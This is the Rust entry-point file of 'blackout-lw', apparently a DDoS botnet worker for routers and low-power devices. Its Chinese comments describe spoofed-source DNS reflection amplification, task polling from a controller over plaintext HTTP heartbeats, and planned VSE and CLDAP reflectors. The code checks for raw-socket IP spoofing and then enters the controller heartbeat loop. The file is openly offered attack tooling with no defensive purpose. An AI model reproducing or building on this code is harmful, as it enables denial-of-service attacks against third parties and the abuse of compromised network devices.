// blackout-lw：Blackout 轻量伪造 Worker（Rust）
//
// 目标平台：路由器 / 低性能设备（x86_64 / armv7 / aarch64 / mipsel）
// 职责：仅 UDP 伪源反射放大（DNS 反射），单二进制，scp 即跑。
// 协议：HTTP/1.1 + JSON 轮询（心跳 = 任务领取），直连 Controller 源站明文。
//
// v1 任务范围：dns_reflector（单段伪源反射）
// 扩展位：vse_reflector / cldap_reflector（引擎已按反射方法通用设计）

mod attack;
mod config;
mod dns;
mod heartbeat;
mod http;
mod reflector;
mod spoof;
mod throttle;

use std::process::ExitCode;

fn main() -> ExitCode {
    let cfg = match config::load() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("blackout-lw: {e}");
            eprintln!("usage: blackout-lw -c <controller:port> -t <worker-token> [-t <threads>] [-pps <max-pps>]");
            return ExitCode::from(2);
        }
    };
    eprintln!(
        "blackout-lw {} starting: controller={} platform={}",
        env!("CARGO_PKG_VERSION"),
        cfg.controller,
        cfg.platform_name()
    );

    // 伪造能力自检：raw socket 创建失败（非 root / 内核限制）→ 直接退出，
    // 由部署方丢弃该节点（不支持伪造就没有存在价值）
    if let Err(e) = spoof::self_check() {
        eprintln!("blackout-lw: IP spoofing unavailable on this host: {e}");
        eprintln!("blackout-lw: node will not register (unsupported platform dropped)");
        return ExitCode::from(1);
    }

    match heartbeat::run(&cfg) {
        Ok(()) => ExitCode::SUCCESS,
        Err(e) => {
            eprintln!("blackout-lw: {e}");
            ExitCode::from(1)
        }
    }
}
